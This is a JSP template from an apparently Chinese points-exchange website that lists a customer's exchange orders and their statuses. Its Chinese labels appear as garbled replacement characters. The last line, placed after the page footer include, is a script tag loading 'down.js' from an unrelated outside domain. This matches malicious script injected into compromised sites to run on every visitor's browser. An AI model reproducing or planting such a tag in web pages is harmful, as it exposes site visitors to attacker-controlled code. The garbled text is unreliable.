<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ctg" uri="/WEB-INF/category.tld"%>
<c:set var="title" value="��������-�һ��б�"/> 
<%@ include file="IncludeTop.jsp" %>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top"> 
      <%@ include file="accountBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
	  <c:if test="${empty userSession}">
	     <table  width="100%" height="300" border="0" cellpadding="0" cellspacing="0">
			<tr > 
			  <td align="center" colspan="4" class="red15">����û�е�½��</td>
			</tr>
		</table>
	  </c:if >
	  <c:if test="${!empty userSession}">
	  <c:set var="customer" value="${userSession.customer}"/>         
      <table width="100%" border="0" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
        
        
        
        <tr bgcolor="#ACD1FF"> 
          <td height="28" colspan="5" align="center"><strong>          ���Ķһ��б�</strong></td>
          </tr>
        
        <tr bgcolor="#E1EFFF"> 
          <td width="68" height="34" align="center">�һ����</td>
          <td width="86" align="center">�һ�����</td>
          <td width="82" align="center">�һ�����</td>
          <td width="56" align="center">��Ʒ��</td>
          <td width="43" align="center">״̬</td>
        </tr>
        <c:if test="${empty result.exchangeList}"> 
        <tr> 
          <td height="107" colspan="5" align="center" class="red15"> 
            ��Ϊ�գ�</td>
        </tr>
        </c:if>
		<c:if test="${!empty result.exchangeList}">
		<c:forEach var="item" items="${result.exchangeList}" > 
        <tr> 
          <td height="44"><a href='<c:url value="/getExchange.do?changeSeq="/><c:out value="${item.changeSeq}"/>'><c:out value="${item.changeSeq}"/></a></td>
          <td><c:out value="${item.createTime}"/></td>
          <td><c:out value="${item.totalPoint}"/></td>
          <td><c:out value="${item.totalCount}"/></td>
          <c:choose>
			  <c:when test="${item.status eq 'I'}"> 
			       <td align="center" alt="���¶���,δȷ��">���¶���</td>
			  </c:when>
			  <c:when test="${item.status eq 'W'}"> 
     			   <td align="center" alt="���¶���,ȷ��δ�ɹ�(���ֲ���)">���ֲ���</td>
			  </c:when>
			  <c:when test="${item.status eq 'C'}"> 
			       <td align="center" alt="������ȷ��,�ȴ�����">��ȷ��</td>
			  </c:when>
			  <c:when test="${item.status eq 'S'}"> 
     			   <td align="center" alt="�����ɹ�">�����ɹ�</td>
			  </c:when>
			  <c:when test="${item.status eq 'F'}"> 
     			   <td align="center" alt="����δ�ɹ�">����δ�ɹ�</td>
			  </c:when>
			  <c:otherwise> 
     			   <td align="center">&nbsp;</td>			  
			  </c:otherwise>
		  </c:choose>
		  </tr>
        </c:forEach>
		</c:if> 
      </table>
  </c:if >    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>